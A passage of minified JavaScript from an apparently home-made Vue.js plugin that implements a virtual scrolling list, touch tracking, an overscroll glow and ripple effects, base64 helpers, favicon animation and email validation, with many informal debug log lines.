=i;offsetTop =i >0 ?heights[i -1]:0;containerHeight =heights[l -1];for (endIndex =i;endIndex <l &&heights[endIndex]<scroll.bottom;endIndex++);if (endIndex ===-1){endIndex =items.length -1 }else {endIndex++}}else {var buffer =this.buffer;var poolSize =this.poolSize;startIndex =~~((~~(scroll.top / itemHeight)-buffer)/ poolSize)*poolSize;endIndex =~~((Math.ceil(scroll.bottom / itemHeight)+buffer)/ poolSize)*poolSize;};if (startIndex <0){startIndex =0;};if (endIndex >l){endIndex =l;};if (itemHeight !==null){offsetTop =startIndex *itemHeight;containerHeight =l *itemHeight;};if (force ||startIndex !==this._startIndex ||endIndex !==this._endIndex ||l !==this._length){this.keysEnabled =!(startIndex >this._endIndex ||endIndex <this._startIndex);this._length =l;this._startIndex =startIndex;this._endIndex =endIndex;this.itemContainerStyle={height:this.itemContainerHeight +'px',};this.visibleItems=items.slice(startIndex,endIndex);var sttOff=startIndex;for (var i=0;i<this.visibleItems.length;i++){var topoff=this.itemHeight*sttOff;sttOff++;this.visibleItems[i].styleCus={height:this.itemHeight+'px',left:'0px',position:'absolute',boxSizing:"border-box",display:"block",width:"100%",outline:"none",lineHeight:"inherit",transform:'translate3d(0px,'+topoff+'px,0px)' };};console.log("TOP NE:"+topoff);}}},scrollToItem:function(index){var scrollTop;if (this.itemHeight ===null){scrollTop =index >0 ?this.heights[index -1]:0;}else {scrollTop =index *this.itemHeight;};this.$el.scrollTop =scrollTop;},applyPageMode:function(){if (this.pageMode){this.addWindowScroll()}else {this.removeWindowScroll()}},addWindowScroll:function(){window.addEventListener('scroll',this.handleScroll,true);window.addEventListener('resize',this.handleResize);},removeWindowScroll:function (){window.removeEventListener('scroll',this.handleScroll,true);window.removeEventListener('resize',this.handleResize);},handleScroll:function(){requestAnimationFrame(this.updateVisibleItems);},handleResize:function(){console.log("reszie roi ne!");if(this._ready){this.updateVisibleItems();}},handleVisibilityChange:function(isVisible,entry){console.log("an hien neea!");if (this._ready &&(isVisible ||entry.boundingClientRect.width !==0 ||entry.boundingClientRect.height !==0)){this.updateVisibleItems();}},},mounted:function (){this.$nextTick(function(){this.findScroller();this.fecthDB();this.applyPageMode();this.itemsStyle ={transform:'translate3d(0px,0px,0px)',padding:"0px" };this._ready =true;})},beforeDestroy:function(){this.removeWindowScroll();this.$off();this.data=null;this.computed=null;},created:function(){this._ready =false;this._startIndex =0;var prerender =parseInt(this.prerender);if (prerender >0){this.visibleItems =this.items.slice(0,prerender);console.log("Length luc creat:"+this.visibleItems.length);this._length =this.visibleItems.length;this._endIndex =this._length -1;}else {this._endIndex =0;this._length =0;}}});Vue.component("nbr-virtual-rezise",{template:'<div class="resize-observer" tabindex="-1"></div>',computed:{isIE:function(){return this.getInternetExplorerVersion();}},methods:{getInternetExplorerVersion:function(){console.log("get IE browsre FIRST TIME");var ua =window.navigator.userAgent;var msie =ua.indexOf('MSIE ');if (msie >0){return parseInt(ua.substring(msie +5,ua.indexOf('.',msie)),10);}var trident =ua.indexOf('Trident/');if (trident >0){var rv =ua.indexOf('rv:');return parseInt(ua.substring(rv +3,ua.indexOf('.',rv)),10);}var edge =ua.indexOf('Edge/');if (edge >0){return parseInt(ua.substring(edge +5,ua.indexOf('.',edge)),10);}return -1;},notify:function (){this.$emit('notify')},addResizeHandlers:function (){this._resizeObject.contentDocument.defaultView.addEventListener('resize',this.notify);if (this._w !==this.$el.offsetWidth ||this._h !==this.$el.offsetHeight){this.notify()}},removeResizeHandlers:function (){if (this._resizeObject &&this._resizeObject.onload){if (!this.isIE &&this._resizeObject.contentDocument){this._resizeObject.contentDocument.defaultView.removeEventListener('resize',this.notify)};delete this._resizeObject.onload }}},mounted:function(){this.$nextTick(function(){this._w =this.$el.offsetWidth;this._h =this.$el.offsetHeight;});var object =document.createElement('object');this._resizeObject =object;object.setAttribute('style','display:block;position:absolute;top:0;left:0;height:100%;width:100%;overflow:hidden;pointer-events:none;z-index:-1;');object.onload =this.addResizeHandlers;object.type ='text/html';if (this.isIE){this.$el.appendChild(object)};object.data ='about:blank';if (!this.isIE){this.$el.appendChild(object)}},beforeDestroy:function(){this.removeResizeHandlers()}});Vue.directive('focus',{inserted:function (el){el.focus()}});var _createClassTOUCH =function (){function defineProperties(target,props){for (var i =0;i <props.length;i++){var descriptor =props[i];descriptor.enumerable =descriptor.enumerable ||false;descriptor.configurable =true;if ("value" in descriptor)descriptor.writable =true;Object.defineProperty(target,descriptor.key,descriptor);}}return function (Constructor,protoProps,staticProps){if (protoProps)defineProperties(Constructor.prototype,protoProps);if (staticProps)defineProperties(Constructor,staticProps);return Constructor;};}();function _classCallCheck(instance,Constructor){if (!(instance instanceof Constructor)){throw new TypeError("Cannot call a class as a function");}};var getPointerData =function getPointerData(evt){return evt.touches ?evt.touches[evt.touches.length -1]:evt;};var getPosition =function getPosition(evt){var data =getPointerData(evt);return {x:data.clientX,y:data.clientY };};var TrackerSupportTOUCH =function (){function Tracker(touch){_classCallCheck(this,Tracker);this.updateTime =Date.now();this.delta ={x:0,y:0 };this.velocity ={x:0,y:0 };this.lastPosition =getPosition(touch);}Tracker.prototype.update =function update(touch){var velocity =this.velocity,updateTime =this.updateTime,lastPosition =this.lastPosition;var now =Date.now();var position =getPosition(touch);var delta ={x:-(position.x -lastPosition.x),y:-(position.y -lastPosition.y)};var duration =now -updateTime ||16;var vx =delta.x / duration *1e3;var vy =delta.y / duration *1e3;velocity.x =vx *0.8 +velocity.x *0.2;velocity.y =vy *0.8 +velocity.y *0.2;this.delta =delta;this.updateTime =now;this.lastPosition =position;};return Tracker;}();var TouchRecord =function (){function TouchRecord(){_classCallCheck(this,TouchRecord);this.touchList ={};this.lastTouch =null;this.activeTouchID =undefined;}TouchRecord.prototype.__add =function __add(touch){if (this.__has(touch))return null;var tracker =new TrackerSupportTOUCH(touch);this.touchList[touch.identifier]=tracker;return tracker;};TouchRecord.prototype.__renew =function __renew(touch){if (!this.__has(touch))return null;var tracker =this.touchList[touch.identifier];tracker.update(touch);return tracker;};TouchRecord.prototype.__delete =function __delete(touch){return delete this.touchList[touch.identifier];};TouchRecord.prototype.__has =function __has(touch){return this.touchList.hasOwnProperty(touch.identifier);};TouchRecord.prototype.__setActiveID =function __setActiveID(touches){this.activeTouchID =touches[touches.length -1].identifier;this.lastTouch =this.touchList[this.activeTouchID];};TouchRecord.prototype.__getActiveTracker =function __getActiveTracker(){var touchList =this.touchList,activeTouchID =this.activeTouchID;return touchList[activeTouchID];};TouchRecord.prototype.isActive =function isActive(){return this.activeTouchID !==undefined;};TouchRecord.prototype.getDelta =function getDelta(){var tracker =this.__getActiveTracker();if (!tracker){return this.__primitiveValue;}return _extends({},tracker.delta);};TouchRecord.prototype.getVelocity =function getVelocity(){var tracker =this.__getActiveTracker();if (!tracker){return this.__primitiveValue;}return _extends({},tracker.velocity);};TouchRecord.prototype.getLastPosition =function getLastPosition(){var coord =arguments.length >0 &&arguments[0]!==undefined ?arguments[0]:'';var tracker =this.__getActiveTracker()||this.lastTouch;var position =tracker ?tracker.lastPosition :this.__primitiveValue;if (!coord)return _extends({},position);if (!position.hasOwnProperty(coord))return 0;return position[coord];};TouchRecord.prototype.updatedRecently =function updatedRecently(){var tracker =this.__getActiveTracker();return tracker &&Date.now()-tracker.updateTime <30;};TouchRecord.prototype.track =function track(evt){var _this =this;var targetTouches =evt.targetTouches;[].concat(targetTouches).forEach(function (touch){_this.__add(touch);});return this.touchList;};TouchRecord.prototype.update =function update(evt){var _this2 =this;var touches =evt.touches,changedTouches =evt.changedTouches;[].concat(touches).forEach(function (touch){_this2.__renew(touch);});this.__setActiveID(changedTouches);return this.touchList;};TouchRecord.prototype.release =function release(evt){var _this3 =this;this.activeTouchID =undefined;[].concat(evt.changedTouches).forEach(function (touch){_this3.__delete(touch);});return this.touchList;};_createClassTOUCH(TouchRecord,[{key:'__primitiveValue',get:function get(){return {x:0,y:0 };}}]);return TouchRecord;}();var OverScrollNBRUT =function (options){var self,defaults,touch,GLOW_MAX_OPACITY ,GLOW_MAX_OFFSET ,MAX_OVERSCROLL,overscrollEffectColor,container,classofContent,willOverscroll,typeOverScroll,over_glowScrollOverling,overX,overY,startX,startY,distX,distY,positionX,positionY,dir_touch_y,dir_touch_x,dir_glow_y,idDestroy,idDestroyScrollover,limit_y,limit_x,limitGlowOver,old_offset_dir=0,dir_scroll,content,offset_dir,limit_dir,canvas,size,overscrollEffect,loadData,resetload,block_overScroll=false,touchSupport,supportsPassive,startRender=20,durationRender=300,timeStartRender,refresher;var OverScrollNBRUT =function (){self =this;defaults ={GLOW_MAX_OPACITY:0.3,GLOW_MAX_OFFSET:0.15,MAX_OVERSCROLL:150,overscrollEffect:'glow',overscrollEffectColor:"green",typeOverScroll:'',refresher:false,supportsPassive:false };this.initialize();};OverScrollNBRUT.prototype.setDefaultsOptions =function (){for (var key in defaults){if (!options[key]){options[key]=defaults[key];}}};OverScrollNBRUT.prototype.findChild =function (parentElem,className){var children =parentElem.childNodes;var res =null;[].forEach.call(children,function(child){if(child.className.match(className)){res=child;}});return res;};OverScrollNBRUT.prototype.update_offset_limit_dir=function(){offset_dir=container.scrollTop;limit_dir=size.content.height-size.container.height;if(offset_dir==0 ||offset_dir+size.container.height==size.content.height){if(offset_dir>old_offset_dir){dir_scroll="down" }else {dir_scroll="up" }willOverscroll=true;}else willOverscroll=false;old_offset_dir=offset_dir;};OverScrollNBRUT.prototype.upsizeCanvas=function(){if (overscrollEffect !=='glow')return;var elem=canvas.elem;var context=canvas.context;var DPR=window.devicePixelRatio ||1;var nextWidth =size.container.width*DPR ;var nextHeight =size.container.height *DPR;if (nextWidth ===elem.width &&nextHeight ===elem.height){return;}elem.width =nextWidth;elem.height =nextHeight;elem.style.width =size.container.width+"px";elem.style.height =size.container.height+"px";context.scale(DPR,DPR);};OverScrollNBRUT.prototype.getSize =function (){return {container:{width:container.clientWidth,height:container.clientHeight,},content:{width:content.offsetWidth -content.clientWidth +content.scrollWidth,height:content.offsetHeight -content.clientHeight +content.scrollHeight,},};};OverScrollNBRUT.prototype.initialize =function (){if (options.container){self.setDefaultsOptions();try {supportsPassive =true;window.addEventListener("test",null,{passive:true});}catch(e){supportsPassive =false;}if(options.refresher){refresher=new mRefresh({freeze:true,onBegin:options.funcReload,nav:options.container,parentRefresher:options.container,scrollEl:options.container.childNodes[0]});}overscrollEffect=options.overscrollEffect;overscrollEffectColor=options.overscrollEffectColor;if(overscrollEffect=="glow"){var dcanvas=document.createElement('canvas');dcanvas.className ='overscroll-glow';options.container.appendChild(dcanvas);console.log(" TESOTKSOFK OFKSOFKSKOFSOKFSKOFOKF SFS");canvas =self.findChild(options.container,'overscroll-glow');canvas ={elem:canvas,context:canvas.getContext('2d')};canvas.elem.style.display ="none";canvas.elem.style.pointerEvents ="none";}container=options.container.childNodes[0];if(options.typeOverScroll){typeOverScroll="vertical";};if(options.callback){loadData=options.callback;resetload=options.resetloading;};if(options.classofContent){classofContent=options.classofContent;console.log("EL :"+container.className);content=self.findChild(container,classofContent);console.log("CONTENT NEL :"+content);}else content=options.container;GLOW_MAX_OPACITY=options.GLOW_MAX_OPACITY;GLOW_MAX_OFFSET=options.GLOW_MAX_OFFSET;MAX_OVERSCROLL=options.MAX_OVERSCROLL;size=self.getSize();console.log("size get la:"+size.container.width);container.addEventListener('scroll',self.handleScroll,supportsPassive ?{passive:true }:false);container.addEventListener('touchstart',self.touchStart,supportsPassive ?{passive:true }:false);container.addEventListener('touchmove',self.touchMove,supportsPassive ?{passive:true }:false);container.addEventListener('touchcancel',self.touchEndCancel ,supportsPassive ?{passive:true }:false);container.addEventListener('touchend',self.touchEndCancel,supportsPassive ?{passive:true }:false);}};OverScrollNBRUT.prototype.handleScroll=function(ev){console.log("TEST SCROLL NEE AE OI:"+container.scrollTop);if(container.scrollTop==0){size=self.getSize();self.upsizeCanvas();self.direction_touchMOV(true);self.extract_limit_glow();overX=0;limitGlowOver=container.getBoundingClientRect().top;cancelAnimationFrame(idDestroy);cancelAnimationFrame(idDestroyScrollover);self.render_when_scroll();}else if(container.scrollTop+container.clientHeight>=content.clientHeight){size=self.getSize();self.upsizeCanvas();self.direction_touchMOV(true);self.extract_limit_glow();overX=0;limitGlowOver=size.container.height+container.getBoundingClientRect().top;cancelAnimationFrame(idDestroy);cancelAnimationFrame(idDestroyScrollover);self.render_when_scroll();}else {if(!over_glowScrollOverling)canvas.elem.style.display ="none";}};OverScrollNBRUT.prototype.updateSize=function(){size=self.getSize();};OverScrollNBRUT.prototype.extract_limit_glow=function(){if(dir_glow_y=="down"){if(overY>=container.getBoundingClientRect().top+MAX_OVERSCROLL){limitGlowOver=container.getBoundingClientRect().top+MAX_OVERSCROLL;}else limitGlowOver=overY;}else {if(overY<=(size.container.height-MAX_OVERSCROLL+container.getBoundingClientRect().top)){limitGlowOver=size.container.height-MAX_OVERSCROLL+container.getBoundingClientRect().top;}else limitGlowOver=overY;}};OverScrollNBRUT.prototype.direction_touchMOV=function(a){if(distY>0){dir_touch_y="down";if(a)dir_glow_y="down";}else {dir_touch_y="up";if(a)dir_glow_y="up";}if(distX>0){dir_touch_x="right";}else {dir_touch_x="left";}};OverScrollNBRUT.prototype.render_when_scroll=function(){if(typeOverScroll=="vertical"){console.log("CASE AUTO NE!!!");block_overScroll=true;if(dir_glow_y=="down"){if(limitGlowOver>=container.getBoundingClientRect().top+MAX_OVERSCROLL){timeStartRender=Date.now();requestAnimationFrame(self.destroy_render);return;}console.log("CASE DOWN NE!");overY=limitGlowOver;requestAnimationFrame(self.overscrollGlow);limitGlowOver=limitGlowOver+(1 +15^2);idDestroyScrollover=requestAnimationFrame(self.render_when_scroll);}else {console.log("CASE UP NE!:"+(container.getBoundingClientRect().top+size.container.height-MAX_OVERSCROLL));if(limitGlowOver<=(container.getBoundingClientRect().top+size.container.height-MAX_OVERSCROLL)){timeStartRender=Date.now();requestAnimationFrame(self.destroy_render);return;}overY=limitGlowOver;requestAnimationFrame(self.overscrollGlow);limitGlowOver=limitGlowOver-(1 +15^2);idDestroyScrollover=requestAnimationFrame(self.render_when_scroll);}}else {}};OverScrollNBRUT.prototype.outBounce=function(n){if ( n <( 1 / 2.75 )){return 7.5625 *n *n;}else if ( n <( 2 / 2.75 )){return 7.5625 *( n -=( 1.5 / 2.75 ))*n +0.75;}else if ( n <( 2.5 / 2.75 )){return 7.5625 *( n -=( 2.25 / 2.75 ))*n +0.9375;}else {return 7.5625 *( n -=( 2.625 / 2.75 ))*n +0.984375;}};OverScrollNBRUT.prototype.inBounce=function(n){return 1 -self.outBounce(1 -n);};OverScrollNBRUT.prototype.inOutBounce=function(n){if (n <.5)return self.inBounce(n *2)*.5;return self.outBounce(n *2 -1)*.5 +.5;};OverScrollNBRUT.prototype.linear=function(n){return n;};OverScrollNBRUT.prototype.destroy_render=function(){console.log("TRONG VONG DESTROY NE!!!!!");if(over_glowScrollOverling){var now =Date.now();var p =(now -timeStartRender)/ durationRender;var val =self.linear(p);console.log("DANG DESTROY NE!!!!!");if(typeOverScroll=="vertical"){if(dir_glow_y=="down"){console.log("offssetTOp:"+container.getBoundingClientRect().top+"-limit:"+limitGlowOver);if(limitGlowOver<=container.getBoundingClientRect().top){over_glowScrollOverling=false;return ;}limitGlowOver=limitGlowOver-(startRender+((limitGlowOver-container.getBoundingClientRect().top+10)-startRender)*val);overY=limitGlowOver;requestAnimationFrame(self.overscrollGlow);if (now -timeStartRender >=durationRender)return;idDestroy=requestAnimationFrame(self.destroy_render);}else {if(limitGlowOver>=(container.getBoundingClientRect().top+size.container.height)){over_glowScrollOverling=false;cancelAnimationFrame(idDestroy);cancelAnimationFrame(idDestroyScrollover);loadData();return ;}limitGlowOver=limitGlowOver+(startRender+(((container.getBoundingClientRect().top+size.container.height)-limitGlowOver+10)-startRender)*val);overY=limitGlowOver;requestAnimationFrame(self.overscrollGlow);console.log("DANG DESTROY NE UP ne !!!!!"+limitGlowOver+"-"+overY);if (now -timeStartRender >=durationRender)return;idDestroy=requestAnimationFrame(self.destroy_render);}}else {if(distX>0){}else {}}}};OverScrollNBRUT.prototype.overscrollGlow=function(){if (!overX &&!overY){return canvas.elem.style.display ="none";};over_glowScrollOverling=true;canvas.elem.style.display ="block";var ctx=canvas.context;ctx.clearRect(0,0,size.content.width,size.container.height);ctx.fillStyle =overscrollEffectColor;console.log("OVERY USE:"+overY);self.renderGlowY(overY);};OverScrollNBRUT.prototype.renderGlowX=function(strength){strength=self.pickInRange(size.container.height-strength,-MAX_OVERSCROLL,MAX_OVERSCROLL);var ctx=canvas.context;ctx.save();if (strength >0){ctx.transform(-1,0,0,1,size.container.width,0);}console.log("TO TRONG X NE");var opacity =self.pickInRange(Math.abs(strength)/ MAX_OVERSCROLL,0,GLOW_MAX_OPACITY);var startOffset =self.pickInRange(opacity,0,GLOW_MAX_OFFSET)*size.container.width;var x =Math.abs(strength);var y =touch.getLastPosition('y')||(size.container.height / 2);ctx.globalAlpha =opacity;ctx.beginPath();ctx.moveTo(0,-startOffset);ctx.quadraticCurveTo(x,y,0,size.container.height +startOffset);ctx.fill();ctx.closePath();ctx.restore();};OverScrollNBRUT.prototype.renderGlowY=function(strength){console.log("DANG RENDER "+dir_glow_y);if(dir_glow_y=="down"){strength=strength-container.getBoundingClientRect().top+size.container.height;}else {strength=strength-container.getBoundingClientRect().bottom+size.container.height;}strength=self.pickInRange(size.container.height-strength,-MAX_OVERSCROLL,MAX_OVERSCROLL);if(strength<=0){console.log("KH)00000000000000000000000");}var ctx=canvas.context;ctx.save();if (strength >0){console.log("trong strn:" +(strength));ctx.transform(1,0,0,-1,0,size.container.height);}var opacity =self.pickInRange(Math.abs(strength)/ MAX_OVERSCROLL,0,GLOW_MAX_OPACITY);var startOffset =self.pickInRange(opacity,0,GLOW_MAX_OFFSET)*size.container.width;var x =overX ||(size.container.width / 2);var y =Math.abs(strength);ctx.globalAlpha =opacity;ctx.beginPath();ctx.moveTo(-startOffset,0);ctx.quadraticCurveTo(x,y,size.container.width +startOffset,0);ctx.fill();ctx.closePath();ctx.restore();};OverScrollNBRUT.prototype.pickInRange=function(value){var min =arguments.length >1 &&arguments[1]!==undefined ?arguments[1]:-Infinity;var max =arguments.length >2 &&arguments[2]!==undefined ?arguments[2]:Infinity;return Math.max(min,Math.min(value,max));};OverScrollNBRUT.prototype.touchStart=function(evt){if(container.scrollTop==0){mRefresh.touchStartRE(evt);}startX =evt.changedTouches[0].pageX;startY =evt.changedTouches[0].pageY;};OverScrollNBRUT.prototype.touchMove=function(evt){distX=evt.changedTouches[0].pageX -startX;distY=evt.changedTouches[0].pageY -startY;self.direction_touchMOV(false);self.update_offset_limit_dir();if(willOverscroll &&(container.scrollTop+container.clientHeight>=content.clientHeight &&dir_touch_y=="up")||willOverscroll &&(container.scrollTop==0 &&dir_touch_y=="down")){overX=evt.touches[0].clientX;overY=evt.touches[0].clientY;size=self.getSize();self.upsizeCanvas();self.direction_touchMOV(true);self.extract_limit_glow();console.log("TEST DIR:"+dir_touch_y);if(container.scrollTop==0){resetload(1);mRefresh.touchMoveRE(evt);}else {cancelAnimationFrame(idDestroy);cancelAnimationFrame(idDestroyScrollover);requestAnimationFrame(self.overscrollGlow);}}console.log("TOUCH MOVE:"+evt.touches[0].clientY);};OverScrollNBRUT.prototype.touchEndCancel=function(evt){if(container.scrollTop==0){mRefresh.touchEndRE(evt);resetload(0);};cancelAnimationFrame(idDestroy);cancelAnimationFrame(idDestroyScrollover);timeStartRender=Date.now();requestAnimationFrame(self.destroy_render);};OverScrollNBRUT.prototype.destroynbr=function(){refresher.unbindEvents();container.removeEventListener("scroll",self.handleScroll,supportsPassive ?{passive:true }:false);container.removeEventListener("touchMove",self.touchMove,supportsPassive ?{passive:true }:false);container.removeEventListener("touchstart",self.touchStart,supportsPassive ?{passive:true }:false);container.removeEventListener("touchend",self.touchEndCancel,supportsPassive ?{passive:true }:false);container.removeEventListener("touchcancel",self.touchEndCancel,supportsPassive ?{passive:true }:false);};return new OverScrollNBRUT();};Vue.directive('nbr-over-scroll',{bind:function (el,binding,vnode){vnode.context.$nextTick(function(){overScroll=OverScrollNBRUT({container:el,refresher:binding.value.refresher ?true:false,classofContent:'item-container',typeOverScroll:"vertical",callback:binding.value.callback,resetloading:binding.value.resetloading,funcReload:binding.value.funcReload });});},unbind:function(el){overScroll.destroynbr();}});var RippleNBRUT=function (options){var self,defaults,waves=[],duration,colorRipple,fillRipple,panelRip,el;var RippleNBRUT =function (){self =this;defaults ={duration:450,colorRipple:"green",fillRipple:false };this.initialize();};RippleNBRUT.prototype.setDefaultsOptions =function (){for (var key in defaults){if (!options[key]){options[key]=defaults[key];}}};RippleNBRUT.prototype.initialize =function (){if (options.el){self.setDefaultsOptions();duration=options.duration;el=options.el;colorRipple=options.colorRipple;fillRipple=options.fillRipple;panelRip=document.createElement('div');panelRip.className ='nbr-ripple-ink';el.appendChild(panelRip);console.log("ADD RIPPLE NE AR!!");el.addEventListener('mouseleave',self.mouseLeave);el.addEventListener('mouseup',self.mouseUp);el.addEventListener('mousedown',self.mouseDown);}};RippleNBRUT.prototype.mouseUp =function (){self.up();};RippleNBRUT.prototype.mouseDown =function (ev){self.up();new Wave(ev.clientX,ev.clientY);};RippleNBRUT.prototype.mouseLeave =function (){self.up();};RippleNBRUT.prototype.up =function (){waves.forEach(function(wave){wave.up();});};RippleNBRUT.prototype.destroyneae =function (){waves=null;el.removeEventListener('mouseleave',self.mouseLeave);el.removeEventListener('mouseup',self.mouseUp);el.removeEventListener('mousedown',self.mouseDown);};var Wave =function (x,y){var rect =el.getBoundingClientRect();waves.push(this);this.element =document.createElement('div');this.element.className="ripple";this.element.setAttribute('touch-action','none');this.element.addEventListener('onmouseup',self.up);this.element.addEventListener('onmouseleave',self.up);if(colorRipple=="random"){var hue =Math.random()*360;this.element.style.backgroundColor ='hsl(' +hue +',85%,67%)';}else{this.element.style.backgroundColor =colorRipple;}if(fillRipple){this.element.style.left ='0px';this.element.style.top ='0px';this.element.style.right ='0px';this.element.style.bottom ='0px';}else {if (rect.width ==rect.height){var max =rect.width *1.412;}else {var max =Math.sqrt(rect.width *rect.width +rect.height *rect.height);};this.element.style.height=max/2+'px';this.element.style.width=max/2+'px';this.element.style.left =(x-rect.left-(max/4))+'px';this.element.style.top =(y-rect.top-(max/4))+'px';};el.childNodes[el.childNodes.length-1].appendChild(this.element);this.scale =this.element.animate([{transform:'scale(0)'},{transform:'scale(1)'},],{duration:duration,easing:'cubic-bezier(.22,.67,.52,.92)',fill:'forwards',});};Wave.prototype ={up:function(){this.up =function(){};this.opacity =this.element.animate([{opacity:0.66},{opacity:0},],{duration:duration,fill:'forwards',});this.opacity.onfinish =function(){this.element.remove();if(waves)waves.splice(waves.indexOf(this),1);}.bind(this);}};return new RippleNBRUT();};Vue.directive('nbr-ink-ripple',{bind:function (el,binding,vnode){vnode.context.$nextTick(function(){rippleNow=RippleNBRUT({el:el,colorRipple:Vue.rippleColor_time_default,duration:Vue.rippleColor_time_default });console.log("BINDDDDDDDDDDD LOOOOOOOOOOOOOOOOOO");});},unbind:function(el){rippleNow.destroyneae();console.log("UNBIND DAY NEEE!!!!");}});Vue.component("nbr-valuecolumn",{template:'<span class="highlightnbrup">{{valuecol}}</span>',props:['valuecolumn'],props:{valuecolumn:{type:String|Number|Object}},computed:{valuecol:{get:function(){return this.valuecolumn;},set:function(newValue){console.log(" get now la "+newValue);}}},data:function(){return{value:this.valuecolumn,vamodelco:this.valuecolumn.value }},watch:{},mounted:function(){}});Vue.directive('nbr-auto-up-height',{bind:function(el,vnode){var emit =function emit(vnode,name,data){var handlers =vnode.child;if (handlers &&handlers.hasOwnProperty(name)){var handler =handlers[name];var fn =handler.fns ||handler.fn;if (typeof fn ==='function'){fn(data);}}};console.log("height cua cai nay la:"+el.offsetHeight);emit(vnode,'fallbackscope',el.offsetHeight);Vue.nextTick(function(){el.style.color ='red';el.style.height =el.offsetHeight+'px';});var afasfasf=0;}});if(!Cookie.enabled()){var localNBRcookies=window.sessionStorage;alert("You Must Enable Cookies to sure application work well.");};var NBR_VUE ={install:function install(Vue,options){Vue.rippleColor_default="green";Vue.rippleColor_time_default=450;Vue._throttle=function (func,limit){var lastFunc;var lastRan;return function (){var context =this;var args =arguments;if (!lastRan){func.apply(context,args);lastRan =Date.now();}else {clearTimeout(lastFunc);lastFunc =setTimeout(function (){if (Date.now()-lastRan >=limit){func.apply(context,args);lastRan =Date.now();}},limit -(Date.now()-lastRan));}};};Vue._debounce=function (func,delay){var inDebounce;return function (){var context =this;var args =arguments;clearTimeout(inDebounce);inDebounce =setTimeout(function (){return func.apply(context,args);},delay);};};Vue.crptsf={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",en:function(input){var output ="";var chr1,chr2,chr3,enc1,enc2,enc3,enc4;var i =0;input =Vue.crptsf._utf8_encode(input);while (i <input.length){chr1 =input.charCodeAt(i++);chr2 =input.charCodeAt(i++);chr3 =input.charCodeAt(i++);enc1 =chr1 >>2;enc2 =((chr1 &3)<<4)|(chr2 >>4);enc3 =((chr2 &15)<<2)|(chr3 >>6);enc4 =chr3 &63;if (isNaN(chr2)){enc3 =enc4 =64;}else if (isNaN(chr3)){enc4 =64;}output =output +this._keyStr.charAt(enc1)+this._keyStr.charAt(enc2)+this._keyStr.charAt(enc3)+this._keyStr.charAt(enc4);}return output;},de:function(input){var output ="";var chr1,chr2,chr3;var enc1,enc2,enc3,enc4;var i =0;input =input.replace(/[^A-Za-z0-9\+\/\=]/g,"");while (i <input.length){enc1 =this._keyStr.indexOf(input.charAt(i++));enc2 =this._keyStr.indexOf(input.charAt(i++));enc3 =this._keyStr.indexOf(input.charAt(i++));enc4 =this._keyStr.indexOf(input.charAt(i++));chr1 =(enc1 <<2)|(enc2 >>4);chr2 =((enc2 &15)<<4)|(enc3 >>2);chr3 =((enc3 &3)<<6)|enc4;output =output +String.fromCharCode(chr1);if (enc3 !=64){output =output +String.fromCharCode(chr2);}if (enc4 !=64){output =output +String.fromCharCode(chr3);}}output =Vue.crptsf._utf8_decode(output);return output;},_utf8_encode:function(string){string =string.replace(/\r\n/g,"\n");var utftext ="";for (var n =0;n <string.length;n++){var c =string.charCodeAt(n);if (c <128){utftext +=String.fromCharCode(c);}else if ((c >127)&&(c <2048)){utftext +=String.fromCharCode((c >>6)|192);utftext +=String.fromCharCode((c &63)|128);}else {utftext +=String.fromCharCode((c >>12)|224);utftext +=String.fromCharCode(((c >>6)&63)|128);utftext +=String.fromCharCode((c &63)|128);}}return utftext;},_utf8_decode:function(utftext){var string ="";var i =0;var c =c1 =c2 =0;while (i <utftext.length){c =utftext.charCodeAt(i);if (c <128){string +=String.fromCharCode(c);i++;}else if ((c >191)&&(c <224)){c2 =utftext.charCodeAt(i +1);string +=String.fromCharCode(((c &31)<<6)|(c2 &63));i +=2;}else {c2 =utftext.charCodeAt(i +1);c3 =utftext.charCodeAt(i +2);string +=String.fromCharCode(((c &15)<<12)|((c2 &63)<<6)|(c3 &63));i +=3;}}return string;}};Vue.afavi={ar_listic:new Array(),head :document.getElementsByTagName("head")[0],loopTimeout :null,changeFavicon :function(iconURL){newLink =document.createElement("link");newLink.type ="image/x-icon";newLink.rel ="icon";newLink.href =iconURL;this.removeExistingFavicons();this.head.appendChild(newLink);},backupFavi:function(){var links =this.head.getElementsByTagName("link");for (var i =0;i <links.length;i++){if (/\bicon\b/i.test(links[i].getAttribute("rel"))){this.ar_listic.push(links[i]);}}},removeExistingFavicons :function(){var links =this.head.getElementsByTagName("link");for (var i =0;i <links.length;i++){if (/\bicon\b/i.test(links[i].getAttribute("rel"))){console.log("SRC:"+links[i].href);this.head.removeChild(links[i]);}}},or_title:"",or_src:"",defaultPause:2000,change:function(iconURL,optionalDocTitle){clearTimeout(this.loopTimeout);if (optionalDocTitle){document.title =optionalDocTitle;}if (iconURL !==""){this.changeFavicon(iconURL);}},animate:function(icons,optionalDelay,titlenew){if(this.or_title=="")this.or_title=document.title;if(this.ar_listic.length<1){this.backupFavi();};clearTimeout(this.loopTimeout);icons.forEach(function(icon){(new Image()).src =icon;});optionalDelay =optionalDelay ||this.defaultPause;titlenew =titlenew ||document.title;document.title=titlenew;var iconIndex =0;this.changeFavicon(icons[iconIndex]);this.loopTimeout =setTimeout(function animateFunc(){iconIndex =(iconIndex +1)%icons.length;Vue.afavi.changeFavicon(icons[iconIndex]);Vue.afavi.loopTimeout =setTimeout(animateFunc,optionalDelay);},optionalDelay);},stopAnimate:function(){clearTimeout(this.loopTimeout);this.removeExistingFavicons();document.title=this.or_title;for (var i =0;i <this.ar_listic.length;i++){this.head.appendChild(this.ar_listic[i]);}}};Vue.validEmail=function (email){var emailReg =/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;return emailReg.test(email);};Vue.st_const_localnbrss=window.sessionStorage;Vue.st_const_localnbrst=window.localStorage;Vue.st={u:'user',ukey:'userkey',bc:'browser',bckey:'browserkey',readyFile:'Resi',readyFilekey:'ReadyFIle' };Vue.mobile_detect=function (){var md =new MobileDetect(window.navigator.userAgent),keys 